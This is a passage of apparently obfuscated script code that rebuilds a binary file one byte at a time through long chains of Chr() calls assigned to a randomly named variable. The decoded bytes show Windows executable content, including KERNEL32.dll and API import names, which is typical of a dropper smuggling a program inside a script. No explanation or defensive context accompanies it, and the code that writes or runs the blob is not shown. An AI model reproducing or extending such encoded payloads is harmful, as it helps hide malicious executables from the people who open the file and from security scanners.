GqnqCn=GqnqCn&Chr(108)&Chr(85)&Chr(110)&Chr(119)&Chr(105)&Chr(110)&Chr(100)&Chr(0)&Chr(166)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(83)&Chr(105)&Chr(122)&Chr(101)&Chr(0)&Chr(0)&Chr(232)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(101)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(65)&Chr(0)&Chr(0)&Chr(225)&Chr(2)&Chr(76)&Chr(67)&Chr(77)&Chr(97)&Chr(112)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(65)&Chr(0)&Chr(0)&Chr(26)&Chr(3)&Chr(77)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(84)&Chr(111)&Chr(87)&Chr(105)&Chr(100)&Chr(101)&Chr(67)&Chr(104)&Chr(97)&Chr(114)&Chr(0)&Chr(227)&Chr(2)&Chr(76)&Chr(67)&Chr(77)&Chr(97)&Chr(112)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(87)&Chr(0)&Chr(0)&Chr(61)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(114)
GqnqCn=GqnqCn&Chr(105)&Chr(110)&Chr(103)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(65)&Chr(0)&Chr(0)&Chr(64)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(87)&Chr(0)&Chr(0)&Chr(75)&Chr(69)&Chr(82)&Chr(78)&Chr(69)&Chr(76)&Chr(51)&Chr(50)&Chr(46)&Chr(100)&Chr(108)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(186)&Chr(20)&Chr(64)&Chr(0)
GqnqCn=GqnqCn&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(112)&Chr(134)&Chr(64)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(68)&Chr(134)&Chr(64)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(134)&Chr(64)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(133)&Chr(64)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(84)&Chr(133)&Chr(64)&Chr(0)&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(36)&Chr(133)&Chr(64)&Chr(0)&Chr(18)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(133)&Chr(64)&Chr(0)&Chr(19)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(132)&Chr(64)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(0)&Chr(156)&Chr(132)&Chr(64)&Chr(0)&Chr(25)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(132)&Chr(64)&Chr(0)&Chr(26)&Chr(0)&Chr(0)&Chr(0)&Chr(60)&Chr(132)&Chr(64)&Chr(0)&Chr(27)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(132)&Chr(64)&Chr(0)&Chr(28)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(220)&Chr(131)&Chr(64)&Chr(0)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(188)&Chr(131)&Chr(64)&Chr(0)&Chr(31)&Chr(0)&Chr(0)&Chr(0)&Chr(88)&Chr(131)&Chr(64)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(131)&Chr(64)&Chr(0)&Chr(33)&Chr(0)&Chr(0)&Chr(0)&Chr(40)&Chr(130)&Chr(64)&Chr(0)&Chr(34)&Chr(0)&Chr(0)&Chr(0)&Chr(136)&Chr(129)&Chr(64)&Chr(0)&Chr(120)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(129)&Chr(64)&Chr(0)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(100)&Chr(129)&Chr(64)&Chr(0)&Chr(122)&Chr(0)&Chr(0)&Chr(0)&Chr(84)&Chr(129)&Chr(64)&Chr(0)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(129)&Chr(64)&Chr(0)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(129)&Chr(64)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(7)&Chr(0)&Chr(0)&Chr(0)&Chr(120)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(128)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(5)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(7)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(7)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(18)&Chr(0)&Chr(0)&Chr(0)&Chr(18)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(33)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(53)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(82)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(109)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(112)&Chr(0)&Chr(0)&Chr(0)&Chr(28)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(6)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(0)&Chr(0)&Chr(0)&Chr(10)&Chr(0)&Chr(0)&Chr(0)&Chr(130)&Chr(0)&Chr(0)&Chr(0)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(22)&Chr(0)&Chr(0)&Chr(0)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(145)&Chr(0)&Chr(0)&Chr(0)&Chr(41)&Chr(0)&Chr(0)&Chr(0)&Chr(158)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(164)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(167)&Chr(0)&Chr(0)&Chr(0)&Chr(13)&Chr(0)&Chr(0)&Chr(0)&Chr(183)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(17)&Chr(0)&Chr(0)&Chr(0)&Chr(206)&Chr(0)&Chr(0)&Chr(0)&Chr(2)&Chr(0)&Chr(0)&Chr(0)&Chr(215)&Chr(0)&Chr(0)&Chr(0)&Chr(11)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(7)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(141)&Chr(83)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)
GqnqCn=GqnqCn&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)
